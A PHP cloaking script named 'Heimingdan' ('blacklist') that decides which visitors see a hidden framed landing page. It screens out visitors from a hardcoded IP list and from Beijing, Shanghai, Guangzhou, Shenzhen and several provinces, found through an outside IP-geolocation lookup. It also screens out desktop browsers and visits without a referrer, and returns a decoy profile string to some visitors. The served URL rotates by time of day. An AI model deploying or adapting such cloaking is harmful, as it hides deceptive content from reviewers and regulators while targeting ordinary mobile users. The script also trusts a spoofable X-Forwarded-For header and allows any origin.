<?php
header("Access-Control-Allow-Origin:*");
$heimingdan = new Heimingdan();
if (!$heimingdan->upperurl()) {
    echo "array(4) { ['wx']=> string(8) '[tel]', ['img_src']=> string(71) '[img]', ['name']=> string(9) '[name]', ['gender']=> string(3) '[gender]' }";
    exit;
}
@$referrer = $_GET['re'] ? $_GET['re'] : 0;
@$agent = $_GET['ag'] ? $_GET['ag'] : 0;
 
$isarea = $heimingdan->is_area();
$isip = $heimingdan->is_ip();
$ismobile = $heimingdan->is_mobile(@$agent);
$isfromepage = $heimingdan->getFromPage(@$referrer);
 
$url = $heimingdan->ChangeUrl();
//判断条件：调用变量
if (!$isarea && !$isip && !$ismobile && !$isfromepage) {
    $data = array(
        'res' => true,
        'name' => "<frameset cols='100%'><frame src='".$url."'/></frameset>",
        );
}
else{
    $data = array(
        'res' => false,
        );
}
 
//生成json格式数据 
$json_string = json_encode((object)$data);
echo $json_string;
 
class Heimingdan
{
 
    public function ChangeUrl(){
        /*时间段数组*/
        $timearr = array(
            array('start_time'=>'00:00', 'end_time'=>'07:00', 'url'=>'B地址'),
            array('start_time'=>'07:00', 'end_time'=>'18:00', 'url'=>'A地址'),
            array('start_time'=>'18:00', 'end_time'=>'24:00', 'url'=>'B地址')
        );
 
        date_default_timezone_set('Asia/Shanghai');
        $now_time  = date('H:i');
        foreach ($timearr as $data) {
            if ($data['start_time'] <= $now_time && $now_time < $data['end_time']) {
                $url = $data['url'];
                break;
            }
        }
        return $url;
    }
     
    //判断地区：包含返回true
    public function is_area() {
        $arr = array("北京市","上海市","广州市","深圳市","河南省","西安市","山东省");
 
        $province = $this->getiplocation();
        $city = $this->getiplocation('city');
 
        $isprovince = in_array($province,$arr);
        $iscity = in_array($city,$arr);
        $re = ($isprovince || $iscity) ? true : false;
         
        return $re;
 
    }
 
    //判断IP：包含IP返回true
    public function is_ip(){
        $arr = array("117.136.4.112","117.22.1.26","60.208.156.75","1.81.190.196","27.220.48.58","112.64.68.246","10.231.221.17","175.19.53.123","175.19.41.131","123.149.77.3");
 
        $ip = $this->getIP();
        $re = in_array($ip, $arr);
 
        return $re;
    }
 
 
    //判断终端：移动端返回true,pc端返回false
    public function is_mobile($a){
        $agent = "xinghao+".$a;
        $win = stripos($agent, 'Win') ? true : false;
        $mac = stripos($agent, 'Mac') ? true : false;
 
        if ($win || $mac) {
            return false;
        }
        else{
            return true;
        }
    }
 
    //判断来源：直接打开是false,间接打开是true
    public function getFromPage($a){
         
        //$frompage = strtolower($_SERVER['HTTP_REFERER']);
        $frompage = $a;
        if ($frompage) {
            return true;
        }
        else{
            return false;
        }
    }
 
    public function getIP() {
 
        $realip = '';
 
        if (isset($_SERVER)){
 
            if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
 
                $realip = $_SERVER["HTTP_X_FORWARDED_FOR"];
 
            } else if (isset($_SERVER["HTTP_CLIENT_IP"])) {
 
                $realip = $_SERVER["HTTP_CLIENT_IP"];
 
            } else {
 
                $realip = $_SERVER["REMOTE_ADDR"];
 
            }
 
        } else {
 
            if (getenv("HTTP_X_FORWARDED_FOR")){
 
                $realip = getenv("HTTP_X_FORWARDED_FOR");
 
            } else if (getenv("HTTP_CLIENT_IP")) {
 
                $realip = getenv("HTTP_CLIENT_IP");
 
            } else {
 
                $realip = getenv("REMOTE_ADDR");
 
            }
 
        }
        return $realip;
    }
 
 
    public function getiplocation($location = 'province') {
        $ip = $this->getIP();
        //$url = "http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip=$ip";
        //$url = "http://ip.taobao.com/service/getIpInfo.php?ip=$ip";
        $url = "http://whois.pconline.com.cn/ipJson.jsp?callback=testJson&ip=$ip";
        $ch = curl_init();
 
        curl_setopt($ch,CURLOPT_URL,$url);
 
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); //以文件流方式输出
 
        $a = curl_exec($ch);
 
        /*$strjson = json_decode($a);
        $address = $strjson->data->$location;*/
        $preg = '/"pro":"(.*)","proCode/';
        if ($location == 'city') {
            $preg = '/"city":"(.*)","cityCode/';
        }
        preg_match_all($preg,$a,$arr);
        $address = $arr[1][0];
         
        return $address;
    }
 
    public function upperurl(){
        $upperurl = strtolower($_SERVER['HTTP_REFERER']);
        if ($upperurl) {
            return true;
        }
        else{
            return false;
        }
    }
 
 
}